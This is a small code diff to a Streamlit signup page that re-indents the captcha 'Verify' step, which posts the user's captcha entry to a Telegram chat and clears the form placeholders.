@@ -51,14 +51,15 @@ if signupbut:
     ph3 = st.empty()
     captcha = ph3.text_input('Enter image numbers (make sure images do not contradict each other)')
     ph4 = st.empty()
-    ver = ph4.button('Verify')
-    if ver:
-        st.success("You have successfully created an account.Go to the Login Menu to login")
 
-        # here - st image with my letter
-        tb.send_message(chat_id, 'images: ' + captcha)
-        a = [eval('ph%s.empty()' % i) for i in range(1, 5)]
+ver = ph4.button('Verify')
+if ver:
+    st.success("You have successfully created an account.Go to the Login Menu to login")
 
-        import time
-        time.sleep(2)
+    # here - st image with my letter
+    tb.send_message(chat_id, 'images: ' + captcha)
+    a = [eval('ph%s.empty()' % i) for i in range(1, 5)]
+
+    import time
+    time.sleep(2)
 
